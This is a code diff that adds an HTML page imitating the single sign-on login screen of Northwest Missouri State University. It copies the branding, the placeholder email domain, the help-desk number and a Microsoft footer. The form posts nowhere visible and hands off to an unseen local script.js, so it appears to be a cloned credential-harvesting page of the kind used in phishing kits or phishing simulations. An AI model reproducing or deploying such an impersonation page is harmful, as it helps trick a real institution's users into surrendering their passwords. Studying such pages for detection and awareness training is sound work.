@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=10.000">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        
+        <meta http-equiv="cache-control" content="no-cache,no-store">
+        <meta http-equiv="pragma" content="no-cache">
+        <meta http-equiv="expires" content="-1">
+        <title>Sign In</title>
+        <link rel="stylesheet" type="text/css" href="./style.css">
+    </head>
+    <body dir="ltr" class="body">
+    <div id="noScript" style="position: static; width: 100%; height: 100%; z-index: 100; display: none;">
+        <h1>JavaScript required</h1>
+        <p>JavaScript is required. This web browser does not support JavaScript or JavaScript in this web browser is not enabled.</p>
+        <p>To find out if your web browser supports JavaScript or to enable JavaScript, see web browser help.</p>
+    </div>
+    <!-- <script type="text/javascript" language="JavaScript">
+         document.getElementById("noScript").style.display = "none";
+    </> -->
+    <div id="fullPage">
+        <div id="brandingWrapper" class="float">
+            <div id="branding" class="illustrationClass"></div>
+        </div>
+        <div id="contentWrapper" class="float">
+            <div id="content">
+                <div id="header">
+                    <img class="logoImage" src="./logo.png" alt="sso.nwmissouri.edu">
+                </div>
+                <div id="workArea">
+                    
+                    <div id="authArea" class="groupMargin">
+                        
+                        
+                    <div id="loginArea">        
+                        <div id="loginMessage" class="groupMargin">Sign in with your organizational account</div>
+
+                        <form method="post" id="login-form" autocomplete="off" novalidate="novalidate">
+                            <div id="error" class="fieldMargin error smallText" style="display: none;">
+                                <label id="errorText" for=""></label>
+                            </div>
+
+                            <div id="formsAuthenticationArea">
+                                <div id="userNameArea">
+                                    <input id="email" name="UserName" type="email" value="" tabindex="1" class="text fullWidth" spellcheck="false" placeholder="someone@nwmissouri.edu" autocomplete="off">     
+                                </div>
+
+                                <div id="passwordArea">
+                                    <input id="pwd" name="" type="password" tabindex="2" class="text fullWidth" placeholder="Password" autocomplete="off">                                   
+                                </div>
+                                <div id="kmsiArea" style="display:none">
+                                    <input type="checkbox" name="Kmsi" id="kmsiInput" value="true" tabindex="3">
+                                    <label for="kmsiInput">Keep me signed in</label>
+                                </div>
+                                <div id="submissionArea" class="submitMargin">
+                                    <!-- <span id="submitButton" class="submit" tabindex="4">Sign in</span> -->
+                                    <button id="submitButton" class="submit">Sign in</button>
+                                </div>
+                            </div>
+                        </form>
+
+                            
+                    </div>
+
+                        <div id="introduction" class="groupMargin">
+                            <p>Please sign-in with your Northwest username and password. If you need assistance, please contact Northwest Technology Service Center at 660-562-1634.</p>                     
+                        </div>
+
+                    </div>
+
+                    </div>
+
+                </div>
+                <div id="footerPlaceholder"></div>
+                <div id="footer">
+                    <div id="footerLinks" class="floatReverse">
+                         <div>
+                            <span id="copyright">© 2018 Microsoft</span>
+                            <a id="home" class="pageLink footerLink " href="http://www.nwmissouri.edu/">Home</a>
+                            <a id="helpDesk" class="pageLink footerLink" href="https://www.nwmissouri.edu/compserv/Passwords/index.htm">Help</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+           
+        </div> 
+ 
+    <script src="script.js"></script>
+</body></html>
